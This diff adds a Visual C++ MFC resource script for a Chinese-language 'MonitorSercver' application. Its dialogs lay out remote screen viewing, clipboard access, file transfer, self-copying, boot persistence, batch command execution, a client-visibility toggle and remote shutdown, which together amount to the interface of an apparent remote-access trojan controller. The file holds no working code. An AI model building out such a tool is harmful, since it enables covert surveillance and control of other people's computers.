@@ -1,0 +1,282 @@
+//Microsoft Developer Studio generated resource script.
+//
+#include "resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 2 resource.
+//
+#include "afxres.h"
+
+/////////////////////////////////////////////////////////////////////////////
+#undef APSTUDIO_READONLY_SYMBOLS
+
+/////////////////////////////////////////////////////////////////////////////
+// Chinese (P.R.C.) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)
+#ifdef _WIN32
+LANGUAGE LANG_CHINESE, SUBLANG_CHINESE_SIMPLIFIED
+#pragma code_page(936)
+#endif //_WIN32
+
+#ifdef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// TEXTINCLUDE
+//
+
+1 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "resource.h\0"
+END
+
+2 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "#include ""afxres.h""\r\n"
+    "\0"
+END
+
+3 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "#define _AFX_NO_SPLITTER_RESOURCES\r\n"
+    "#define _AFX_NO_OLE_RESOURCES\r\n"
+    "#define _AFX_NO_TRACKER_RESOURCES\r\n"
+    "#define _AFX_NO_PROPERTY_RESOURCES\r\n"
+    "\r\n"
+    "#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)\r\n"
+    "#ifdef _WIN32\r\n"
+    "LANGUAGE 4, 2\r\n"
+    "#pragma code_page(936)\r\n"
+    "#endif //_WIN32\r\n"
+    "#include ""res\\MonitorSercver.rc2""  // non-Microsoft Visual C++ edited resources\r\n"
+    "#include ""l.chs\\afxres.rc""          // Standard components\r\n"
+    "#endif\r\n"
+    "\0"
+END
+
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Icon
+//
+
+// Icon with lowest ID value placed first to ensure application icon
+// remains consistent on all systems.
+IDR_MAINFRAME           ICON    DISCARDABLE     "res\\MonitorSercver.ico"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog
+//
+
+IDD_MONITORSERCVER_DIALOG DIALOGEX 0, 0, 487, 283
+STYLE DS_MODALFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_POPUP | 
+    WS_VISIBLE | WS_CAPTION | WS_SYSMENU
+EXSTYLE WS_EX_APPWINDOW
+CAPTION "MonitorSercver"
+FONT 9, "宋体", 0, 0, 0x1
+BEGIN
+    CONTROL         "客户端可见",IDC_CHECKVISABLE,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,373,10,55,20
+    CONTROL         "Tab1",IDC_TAB,"SysTabControl32",0x0,10,35,460,230,
+                    WS_EX_DLGMODALFRAME
+    PUSHBUTTON      "开始监听",IDC_BTNSTART,10,5,80,30
+    PUSHBUTTON      "设置",IDC_BTNSETVISABLE,433,10,35,20
+END
+
+IDD_CHAT DIALOG DISCARDABLE  0, 0, 307, 177
+STYLE WS_CHILD
+FONT 10, "System"
+BEGIN
+    EDITTEXT        IDC_EDITMSG,6,6,279,114,ES_MULTILINE | ES_AUTOVSCROLL | 
+                    ES_AUTOHSCROLL | ES_WANTRETURN | WS_VSCROLL
+    EDITTEXT        IDC_EDITSEND,6,125,244,33,ES_MULTILINE | ES_AUTOHSCROLL | 
+                    ES_WANTRETURN
+    PUSHBUTTON      "发送",IDC_BTNSEND,255,125,30,33
+END
+
+IDD_SCREENMONITOR DIALOG DISCARDABLE  0, 0, 227, 127
+STYLE WS_CHILD
+FONT 10, "System"
+BEGIN
+    CONTROL         "",IDC_STATICSCREEN,"Static",SS_BITMAP,5,5,11,11
+    PUSHBUTTON      "开始",IDC_BUTTONSTART,195,5,25,10
+    PUSHBUTTON      "停止",IDC_BUTTONSTOP,195,20,25,10
+END
+
+IDD_OTHERMONITOR DIALOG DISCARDABLE  0, 0, 332, 177
+STYLE WS_CHILD
+FONT 10, "System"
+BEGIN
+    EDITTEXT        IDC_EDITCLIPBOARD,18,18,102,48,ES_MULTILINE | 
+                    ES_AUTOHSCROLL
+    PUSHBUTTON      "获取",IDC_BUTTONGET,126,18,22,16
+    PUSHBUTTON      "置入",IDC_BUTTONSET,126,37,22,16
+    PUSHBUTTON      "复制",IDC_BUTTONCOPY,126,56,22,16
+    EDITTEXT        IDC_EPATHTOSAVE,174,21,68,15,ES_AUTOHSCROLL
+    PUSHBUTTON      "发送",IDC_BTNSENDFILE,247,20,35,15
+    EDITTEXT        IDC_EPATHOFFILE,174,40,68,15,ES_AUTOHSCROLL
+    PUSHBUTTON      "...",IDC_BTNMOREFILE,246,40,15,15
+    GROUPBOX        "文件传输",IDC_STATIC,170,5,140,60
+    GROUPBOX        "剪切板操作",IDC_STATIC,15,7,140,68
+    GROUPBOX        "自启动管理",IDC_STATIC,170,85,140,80
+    GROUPBOX        "CMD操作",IDC_STATIC,15,75,140,90
+    EDITTEXT        IDC_EDITPATHTOCOPY,175,95,130,40,ES_MULTILINE | 
+                    ES_AUTOHSCROLL
+    PUSHBUTTON      "自我复制",IDC_BTNSELFCOPY,220,140,35,20
+    PUSHBUTTON      "开机启动",IDC_BTNONSTART,175,140,40,20
+    EDITTEXT        IDC_EDITBATCONTROL,20,86,130,55,ES_MULTILINE | 
+                    ES_AUTOVSCROLL | ES_WANTRETURN | WS_VSCROLL
+    PUSHBUTTON      "BAT执行",IDC_BATCONTROL,20,147,130,10
+END
+
+IDD_REMOTECONTROL DIALOG DISCARDABLE  0, 0, 247, 172
+STYLE WS_CHILD
+FONT 10, "System"
+BEGIN
+    EDITTEXT        IDC_EDITNAME,145,125,75,15,ES_AUTOHSCROLL
+    PUSHBUTTON      "注销",IDC_BTN_LOGOFF,13,39,35,15
+    PUSHBUTTON      "关机",IDC_BTN_SHUTDOWN,52,39,35,15,BS_CENTER
+    PUSHBUTTON      "隐藏桌面",IDC_BUTTONHIDEDESK,13,15,35,15,BS_CENTER
+    PUSHBUTTON      "显示桌面",IDC_BUTTONSHOWDESK,53,15,35,15
+    PUSHBUTTON      "重启",IDC_BTN_REBOOT,92,39,35,15
+    PUSHBUTTON      "关闭屏幕",IDC_BTNTURNOFFSCR,15,75,35,15
+    PUSHBUTTON      "打开屏幕",IDC_BTNTURNONSCR,55,75,35,15
+END
+
+
+#ifndef _MAC
+/////////////////////////////////////////////////////////////////////////////
+//
+// Version
+//
+
+VS_VERSION_INFO VERSIONINFO
+ FILEVERSION 1,0,0,1
+ PRODUCTVERSION 1,0,0,1
+ FILEFLAGSMASK 0x3fL
+#ifdef _DEBUG
+ FILEFLAGS 0x1L
+#else
+ FILEFLAGS 0x0L
+#endif
+ FILEOS 0x4L
+ FILETYPE 0x1L
+ FILESUBTYPE 0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "080404B0"
+        BEGIN
+            VALUE "CompanyName", "\0"
+            VALUE "FileDescription", "MonitorSercver Microsoft 基础类应用程序\0"
+            VALUE "FileVersion", "1, 0, 0, 1\0"
+            VALUE "InternalName", "MonitorSercver\0"
+            VALUE "LegalCopyright", "版权所有 (C) 2013\0"
+            VALUE "LegalTrademarks", "\0"
+            VALUE "OriginalFilename", "MonitorSercver.EXE\0"
+            VALUE "ProductName", "MonitorSercver 应用程序\0"
+            VALUE "ProductVersion", "1, 0, 0, 1\0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x804, 1200
+    END
+END
+
+#endif    // !_MAC
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// DESIGNINFO
+//
+
+#ifdef APSTUDIO_INVOKED
+GUIDELINES DESIGNINFO DISCARDABLE 
+BEGIN
+    IDD_MONITORSERCVER_DIALOG, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 480
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 276
+    END
+
+    IDD_CHAT, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 300
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 170
+    END
+
+    IDD_SCREENMONITOR, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 220
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 120
+    END
+
+    IDD_OTHERMONITOR, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 325
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 170
+    END
+
+    IDD_REMOTECONTROL, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 240
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 165
+    END
+END
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// String Table
+//
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    IDS_ABOUTBOX            "关于 MonitorSercver(&A)..."
+END
+
+#endif    // Chinese (P.R.C.) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+
+#ifndef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 3 resource.
+//
+#define _AFX_NO_SPLITTER_RESOURCES
+#define _AFX_NO_OLE_RESOURCES
+#define _AFX_NO_TRACKER_RESOURCES
+#define _AFX_NO_PROPERTY_RESOURCES
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)
+#ifdef _WIN32
+LANGUAGE 4, 2
+#pragma code_page(936)
+#endif //_WIN32
+#include "res\MonitorSercver.rc2"  // non-Microsoft Visual C++ edited resources
+#include "l.chs\afxres.rc"          // Standard components
+#endif
+
+/////////////////////////////////////////////////////////////////////////////
+#endif    // not APSTUDIO_INVOKED
+
